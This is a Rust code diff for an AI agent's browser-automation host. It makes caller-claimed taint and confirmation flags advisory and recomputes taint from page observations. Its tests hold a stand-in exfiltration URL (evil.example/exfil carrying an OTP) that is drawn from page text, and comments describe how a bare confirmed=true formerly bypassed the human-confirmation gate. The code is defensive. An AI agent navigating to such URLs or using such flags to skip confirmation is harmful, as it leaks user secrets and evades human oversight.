@@ -38,7 +38,10 @@ use tempo_engine_host::{
     EngineHostConfig, EngineHostError, EngineIpcClient, SharedEngineIpcClient,
 };
 use tempo_net::UrlPolicy;
-use tempo_policy::{decide_action, decide_effect, ConfirmationGate, InputTaint, PolicyDecision};
+use tempo_policy::trust::{
+    action_caller_texts, gate_boundary_effect, requires_observation_evidence, CallerPolicyClaims,
+};
+use tempo_policy::{decide_action, ConfirmationGate, InputTaint};
 use tempo_schema::{Action, ActionBatch, CompiledObservation, NodeId, ObservationDiff, SideEffect};
 use thiserror::Error;
 use url::Url;
@@ -3298,14 +3301,10 @@ fn route_bidi_driver(
 ) -> BidiDispatchResult {
     match command {
         BidiDriverCommand::Navigate(command) => {
-            if let Some(denied) = enforce_bidi_action_policy(
-                id,
-                &command.action,
-                command.input_tainted,
-                command.confirmed,
-            ) {
-                return denied;
-            }
+            let Some(input_tainted) = command.input_tainted else {
+                return missing_bidi_input_taint_result(id);
+            };
+            let claims = CallerPolicyClaims::new(Some(input_tainted), command.confirmed);
             let context = command.context.clone();
             let Ok(handle) = bidi_driver_handle(pool, &context) else {
                 return pool_lock_bidi_error(Some(id));
@@ -3313,6 +3312,15 @@ fn route_bidi_driver(
             let Some(mut driver) = handle else {
                 return unknown_browsing_context_result(id);
             };
+            if let Some(denied) = gate_bidi_command(
+                &mut driver,
+                id,
+                command.action.side_effect(),
+                &action_caller_texts(&command.action),
+                claims,
+            ) {
+                return denied;
+            }
             let url = command.url.clone();
             // Engine round-trip runs with NO pool lock held (issue #230);
             // `driver` is a clone sharing the context's connection + op gate.
@@ -3503,14 +3511,10 @@ fn route_bidi_driver(
             }
         }
         BidiDriverCommand::EvaluateScript(command) => {
-            if let Some(denied) = enforce_bidi_effect_policy(
-                id,
-                SideEffect::Write,
-                command.input_tainted,
-                command.confirmed,
-            ) {
-                return denied;
-            }
+            let Some(input_tainted) = command.input_tainted else {
+                return missing_bidi_input_taint_result(id);
+            };
+            let claims = CallerPolicyClaims::new(Some(input_tainted), command.confirmed);
             let context = command.target.context.clone();
             let Ok(handle) = bidi_driver_handle(pool, &context) else {
                 return pool_lock_bidi_error(Some(id));
@@ -3518,6 +3522,15 @@ fn route_bidi_driver(
             let Some(mut driver) = handle else {
                 return unknown_browsing_context_result(id);
             };
+            if let Some(denied) = gate_bidi_command(
+                &mut driver,
+                id,
+                SideEffect::Write,
+                &[command.expression.as_str()],
+                claims,
+            ) {
+                return denied;
+            }
             let expression = command.expression.clone();
             match futures::executor::block_on(
                 driver.evaluate_script(&expression, command.await_promise),
@@ -3541,30 +3554,45 @@ fn route_bidi_driver(
     }
 }
 
-fn enforce_bidi_action_policy(
-    id: tempo_bidi::CommandId,
-    action: &Action,
-    input_tainted: Option<bool>,
-    confirmed: bool,
-) -> Option<BidiDispatchResult> {
-    let Some(input_tainted) = input_tainted else {
-        return Some(missing_bidi_input_taint_result(id));
-    };
-    let decision = decide_action(action, InputTaint::new(input_tainted));
-    bidi_policy_denial(id, decision, confirmed)
-}
-
-fn enforce_bidi_effect_policy(
+/// Trust boundary for policy-gated BiDi commands (#254): caller-supplied
+/// `inputTainted`/`confirmed` are advisory. Taint is recomputed against the
+/// target context's live observation when that evidence could change the
+/// outcome (see `tempo_policy::trust`), the caller claim only ever escalates,
+/// and a bare `confirmed=true` never satisfies a human gate because no
+/// server-attributable confirmation channel exists at this boundary.
+fn gate_bidi_command(
+    driver: &mut AttachedEngineDriver,
     id: tempo_bidi::CommandId,
     effect: SideEffect,
-    input_tainted: Option<bool>,
-    confirmed: bool,
+    texts: &[&str],
+    claims: CallerPolicyClaims,
 ) -> Option<BidiDispatchResult> {
-    let Some(input_tainted) = input_tainted else {
-        return Some(missing_bidi_input_taint_result(id));
+    let observation = if requires_observation_evidence(effect, texts, claims) {
+        match futures::executor::block_on(driver.observe()) {
+            Ok(observation) => Some(observation),
+            Err(error) => {
+                return Some(BidiDispatchResult::new(
+                    200,
+                    BidiMessage::error(
+                        Some(id),
+                        BidiErrorCode::UnknownError,
+                        format!(
+                            "policy taint recomputation requires an observation, but observe failed: {error}"
+                        ),
+                    ),
+                ));
+            }
+        }
+    } else {
+        None
     };
-    let decision = decide_effect(effect, InputTaint::new(input_tainted));
-    bidi_policy_denial(id, decision, confirmed)
+    match gate_boundary_effect(effect, texts, observation.as_ref(), claims) {
+        Ok(_) => None,
+        Err(required) => Some(BidiDispatchResult::new(
+            200,
+            BidiMessage::error(Some(id), BidiErrorCode::InvalidArgument, required.message()),
+        )),
+    }
 }
 
 fn missing_bidi_input_taint_result(id: tempo_bidi::CommandId) -> BidiDispatchResult {
@@ -3576,30 +3604,6 @@ fn missing_bidi_input_taint_result(id: tempo_bidi::CommandId) -> BidiDispatchRes
             "inputTainted/input_tainted is required for policy-gated BiDi commands",
         ),
     )
-}
-
-fn bidi_policy_denial(
-    id: tempo_bidi::CommandId,
-    decision: PolicyDecision,
-    confirmed: bool,
-) -> Option<BidiDispatchResult> {
-    if decision.requires_confirmation() && !confirmed {
-        Some(BidiDispatchResult::new(
-            200,
-            BidiMessage::error(
-                Some(id),
-                BidiErrorCode::InvalidArgument,
-                format!(
-                    "policy denied: {:?} BiDi command with input_tainted={} requires {:?}; retry with confirmed=true after human confirmation",
-                    decision.side_effect,
-                    decision.input_taint.is_tainted(),
-                    decision.gate
-                ),
-            ),
-        ))
-    } else {
-        None
-    }
 }
 
 fn unknown_browsing_context_result(id: tempo_bidi::CommandId) -> BidiDispatchResult {
@@ -5153,6 +5157,10 @@ mod tests {
                     driver_id: format!("context-{n}"),
                 })
             }
+            // Policy taint recomputation before each gated navigate (#254).
+            HostDriverCommand::Observe => FakeEngineReply::Respond(DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            }),
             HostDriverCommand::Goto { url } => FakeEngineReply::RespondAfter(
                 Duration::from_millis(300),
                 DriverResponse::Observation {
@@ -5214,6 +5222,10 @@ mod tests {
         let goto_arrivals: Arc<Mutex<Vec<std::time::Instant>>> = Arc::new(Mutex::new(Vec::new()));
         let arrivals = Arc::clone(&goto_arrivals);
         let pool = shared_pool_with_fake_engine(move |request| match &request.command {
+            // Policy taint recomputation before each gated navigate (#254).
+            HostDriverCommand::Observe => FakeEngineReply::Respond(DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            }),
             HostDriverCommand::Goto { url } => {
                 if let Ok(mut arrivals) = arrivals.lock() {
                     arrivals.push(std::time::Instant::now());
@@ -5276,6 +5288,10 @@ mod tests {
     #[test]
     fn health_and_drain_respond_while_engine_op_is_in_flight() -> TestResult {
         let pool = shared_pool_with_fake_engine(|request| match &request.command {
+            // Policy taint recomputation before each gated navigate (#254).
+            HostDriverCommand::Observe => FakeEngineReply::Respond(DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            }),
             HostDriverCommand::Goto { url } => FakeEngineReply::RespondAfter(
                 Duration::from_millis(800),
                 DriverResponse::Observation {
@@ -5337,6 +5353,10 @@ mod tests {
                     driver_id: format!("context-{n}"),
                 })
             }
+            // Policy taint recomputation before each gated navigate (#254).
+            HostDriverCommand::Observe => FakeEngineReply::Respond(DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            }),
             HostDriverCommand::Goto { url } => FakeEngineReply::RespondAfter(
                 Duration::from_millis(300),
                 DriverResponse::Observation {
@@ -5464,6 +5484,10 @@ mod tests {
                     driver_id: format!("context-{n}"),
                 })
             }
+            // Policy taint recomputation before each gated navigate (#254).
+            HostDriverCommand::Observe => FakeEngineReply::Respond(DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            }),
             HostDriverCommand::Goto { url } if url.contains("wedged") => FakeEngineReply::Wedge,
             HostDriverCommand::Goto { url } => FakeEngineReply::RespondAfter(
                 Duration::from_millis(50),
@@ -6209,16 +6233,19 @@ mod tests {
     #[test]
     fn bidi_endpoint_routes_navigation_to_attached_engine_driver() -> TestResult {
         let mut pool = SessionPool::default();
-        let handle = attach_driver_handler(&mut pool, |request| {
-            assert_eq!(
-                request.command,
-                HostDriverCommand::Goto {
-                    url: "https://example.test".into(),
+        // A clean-claimed navigate first fetches policy taint evidence
+        // (Observe), then executes the Goto (#254).
+        let handle = attach_driver_handler_seq(&mut pool, 2, |request| match request.command {
+            HostDriverCommand::Observe => DriverResponse::Observation {
+                observation: observation("about:blank", 0),
+            },
+            HostDriverCommand::Goto { url } => {
+                assert_eq!(url, "https://example.test");
+                DriverResponse::Observation {
+                    observation: observation("https://example.test", 1),
                 }
-            );
-            DriverResponse::Observation {
-                observation: observation("https://example.test", 1),
             }
+            _ => DriverResponse::Closed,
         })?;
 
         let response = route_http_request(
@@ -6276,19 +6303,15 @@ mod tests {
     }
 
     #[test]
-    fn bidi_endpoint_allows_confirmed_tainted_navigation_to_attached_engine_driver() -> TestResult {
+    fn bidi_endpoint_denies_confirmed_tainted_navigation_without_confirmation_channel() -> TestResult
+    {
+        // Pre-#254 a bare confirmed=true from the same caller bypassed the
+        // gate. It is now advisory: with no server-attributable confirmation
+        // channel the tainted navigation stays blocked, without engine IPC.
+        let (client_stream, mut server_stream) = UnixStream::pair()?;
+        server_stream.set_nonblocking(true)?;
         let mut pool = SessionPool::default();
-        let handle = attach_driver_handler(&mut pool, |request| {
-            assert_eq!(
-                request.command,
-                HostDriverCommand::Goto {
-                    url: "https://example.test".into(),
-                }
-            );
-            DriverResponse::Observation {
-                observation: observation("https://example.test", 1),
-            }
-        })?;
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
 
         let response = route_http_request(
             &mut pool,
@@ -6301,13 +6324,59 @@ mod tests {
                 body: br#"{"id":17,"method":"browsingContext.navigate","params":{"context":"tempo-root","url":"https://example.test","inputTainted":true,"confirmed":true}}"#.to_vec(),
             },
         )?;
+
+        assert_eq!(response.status, 200);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["type"], "error");
+        assert_eq!(value["id"], 17);
+        assert_eq!(value["error"], "invalid argument");
+        let message = value["message"]
+            .as_str()
+            .ok_or("BiDi error response should include a message")?;
+        assert!(message.contains("policy denied"));
+        assert!(message.contains("confirmed=true was ignored"));
+        assert_no_driver_ipc(&mut server_stream)?;
+        Ok(())
+    }
+
+    #[test]
+    fn bidi_navigate_recomputes_taint_from_observation_and_blocks_clean_claim() -> TestResult {
+        let mut pool = SessionPool::default();
+        // The engine serves exactly ONE request: the policy-evidence Observe.
+        // Its observation carries a page-provenance span embedded in the
+        // navigation URL, so recomputation blocks the Goto even though the
+        // caller claimed inputTainted=false and confirmed=true. This fails if
+        // server-side recomputation is removed.
+        let handle = attach_driver_handler(&mut pool, |request| {
+            assert_eq!(request.command, HostDriverCommand::Observe);
+            DriverResponse::Observation {
+                observation: tainted_observation("https://current.test", 1, "evil.example/exfil"),
+            }
+        })?;
+
+        let response = route_http_request(
+            &mut pool,
+            HttpRequest {
+                method: "POST".into(),
+                path: "/bidi".into(),
+                headers: BTreeMap::new(),
+                host: None,
+                origin: None,
+                body: br#"{"id":26,"method":"browsingContext.navigate","params":{"context":"tempo-root","url":"https://evil.example/exfil?otp=123456","inputTainted":false,"confirmed":true}}"#.to_vec(),
+            },
+        )?;
         join_driver_handler(handle)?;
 
         assert_eq!(response.status, 200);
         let value: Value = serde_json::from_slice(&response.body)?;
-        assert_eq!(value["type"], "success");
-        assert_eq!(value["id"], 17);
-        assert_eq!(value["result"]["url"], "https://example.test");
+        assert_eq!(value["type"], "error");
+        assert_eq!(value["id"], 26);
+        assert_eq!(value["error"], "invalid argument");
+        let message = value["message"]
+            .as_str()
+            .ok_or("BiDi error response should include a message")?;
+        assert!(message.contains("policy denied"));
+        assert!(message.contains("input_tainted=true"));
         Ok(())
     }
 
@@ -6345,20 +6414,12 @@ mod tests {
     }
 
     #[test]
-    fn bidi_endpoint_routes_script_evaluate_to_attached_engine_driver() -> TestResult {
+    fn bidi_endpoint_denies_client_claimed_clean_script_without_confirmation_channel() -> TestResult
+    {
+        let (client_stream, mut server_stream) = UnixStream::pair()?;
+        server_stream.set_nonblocking(true)?;
         let mut pool = SessionPool::default();
-        let handle = attach_driver_handler(&mut pool, |request| {
-            assert_eq!(
-                request.command,
-                HostDriverCommand::EvaluateScript {
-                    expression: "document.title".into(),
-                    await_promise: true,
-                }
-            );
-            DriverResponse::Evaluated {
-                value: json!("Tempo"),
-            }
-        })?;
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
 
         let response = route_http_request(
             &mut pool,
@@ -6371,14 +6432,18 @@ mod tests {
                 body: br#"{"id":8,"method":"script.evaluate","params":{"expression":"document.title","target":{"context":"tempo-root"},"awaitPromise":true,"inputTainted":false}}"#.to_vec(),
             },
         )?;
-        join_driver_handler(handle)?;
 
         assert_eq!(response.status, 200);
         let value: Value = serde_json::from_slice(&response.body)?;
-        assert_eq!(value["type"], "success");
+        assert_eq!(value["type"], "error");
         assert_eq!(value["id"], 8);
-        assert_eq!(value["result"]["result"], "Tempo");
-        assert_eq!(value["result"]["realm"], "tempo-root");
+        assert_eq!(value["error"], "invalid argument");
+        let message = value["message"]
+            .as_str()
+            .ok_or("BiDi error response should include a message")?;
+        assert!(message.contains("policy denied"));
+        assert!(message.contains("input_tainted=true"));
+        assert_no_driver_ipc(&mut server_stream)?;
         Ok(())
     }
 
@@ -6471,20 +6536,14 @@ mod tests {
     }
 
     #[test]
-    fn bidi_endpoint_allows_confirmed_tainted_script_to_attached_engine_driver() -> TestResult {
+    fn bidi_endpoint_denies_confirmed_tainted_script_without_confirmation_channel() -> TestResult {
+        // Pre-#254 a bare confirmed=true bypassed the gate for tainted
+        // scripts. It is now advisory: the tainted script stays blocked, and
+        // no engine IPC is dispatched.
+        let (client_stream, mut server_stream) = UnixStream::pair()?;
+        server_stream.set_nonblocking(true)?;
         let mut pool = SessionPool::default();
-        let handle = attach_driver_handler(&mut pool, |request| {
-            assert_eq!(
-                request.command,
-                HostDriverCommand::EvaluateScript {
-                    expression: "document.title".into(),
-                    await_promise: true,
-                }
-            );
-            DriverResponse::Evaluated {
-                value: json!("Tempo"),
-            }
-        })?;
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
 
         let response = route_http_request(
             &mut pool,
@@ -6497,13 +6556,52 @@ mod tests {
                 body: br#"{"id":20,"method":"script.evaluate","params":{"expression":"document.title","target":{"context":"tempo-root"},"awaitPromise":true,"inputTainted":true,"confirmed":true}}"#.to_vec(),
             },
         )?;
-        join_driver_handler(handle)?;
 
         assert_eq!(response.status, 200);
         let value: Value = serde_json::from_slice(&response.body)?;
-        assert_eq!(value["type"], "success");
+        assert_eq!(value["type"], "error");
         assert_eq!(value["id"], 20);
-        assert_eq!(value["result"]["result"], "Tempo");
+        assert_eq!(value["error"], "invalid argument");
+        let message = value["message"]
+            .as_str()
+            .ok_or("BiDi error response should include a message")?;
+        assert!(message.contains("policy denied"));
+        assert!(message.contains("confirmed=true was ignored"));
+        assert_no_driver_ipc(&mut server_stream)?;
+        Ok(())
+    }
+
+    #[test]
+    fn bidi_script_denies_confirmed_clean_claim_without_confirmation_channel() -> TestResult {
+        let (client_stream, mut server_stream) = UnixStream::pair()?;
+        server_stream.set_nonblocking(true)?;
+        let mut pool = SessionPool::default();
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
+
+        let response = route_http_request(
+            &mut pool,
+            HttpRequest {
+                method: "POST".into(),
+                path: "/bidi".into(),
+                headers: BTreeMap::new(),
+                host: None,
+                origin: None,
+                body: br#"{"id":27,"method":"script.evaluate","params":{"expression":"pay('12345678')","target":{"context":"tempo-root"},"inputTainted":false,"confirmed":true}}"#.to_vec(),
+            },
+        )?;
+
+        assert_eq!(response.status, 200);
+        let value: Value = serde_json::from_slice(&response.body)?;
+        assert_eq!(value["type"], "error");
+        assert_eq!(value["id"], 27);
+        assert_eq!(value["error"], "invalid argument");
+        let message = value["message"]
+            .as_str()
+            .ok_or("BiDi error response should include a message")?;
+        assert!(message.contains("policy denied"));
+        assert!(message.contains("input_tainted=true"));
+        assert!(message.contains("confirmed=true was ignored"));
+        assert_no_driver_ipc(&mut server_stream)?;
         Ok(())
     }
 
@@ -8818,6 +8916,31 @@ mod tests {
         }))
     }
 
+    /// Like [`attach_driver_handler`], but serves a fixed number of engine
+    /// round-trips (policy taint recomputation adds an Observe before gated
+    /// commands, #254).
+    fn attach_driver_handler_seq<F>(
+        pool: &mut SessionPool,
+        requests: usize,
+        mut handler: F,
+    ) -> Result<thread::JoinHandle<Result<(), EngineHostError>>, Box<dyn Error>>
+    where
+        F: FnMut(DriverRequest) -> DriverResponse + Send + 'static,
+    {
+        let (client_stream, server_stream) = UnixStream::pair()?;
+        pool.attach_engine_driver(Engine::Cdp, EngineIpcClient::from_stream(client_stream))?;
+        Ok(thread::spawn(move || {
+            let mut connection = EngineIpcConnection::from_stream(server_stream);
+            for _ in 0..requests {
+                let request = connection.read_driver_request()?;
+                let request_id = request.id;
+                let response = handler(request);
+                connection.write_driver_response(request_id, response)?;
+            }
+            Ok(())
+        }))
+    }
+
     fn join_driver_handler(
         handle: thread::JoinHandle<Result<(), EngineHostError>>,
     ) -> Result<(), Box<dyn Error>> {
@@ -8895,6 +9018,24 @@ mod tests {
             elements: Vec::new(),
             marks: Vec::new(),
         }
+    }
+
+    /// An observation carrying one page-provenance span, for #254 taint
+    /// recomputation tests.
+    fn tainted_observation(url: &str, seq: u64, page_text: &str) -> CompiledObservation {
+        let mut observation = observation(url, seq);
+        observation.elements = vec![tempo_schema::InteractiveElement {
+            node_id: NodeId("page.content".into()),
+            role: "link".into(),
+            name: vec![tempo_schema::TaintSpan {
+                provenance: tempo_schema::Provenance::Page,
+                text: page_text.into(),
+            }],
+            value: Vec::new(),
+            bounds: None,
+            rank: 1.0,
+        }];
+        observation
     }
 
     fn sample_step_triple(seq: u64) -> StepTriple {
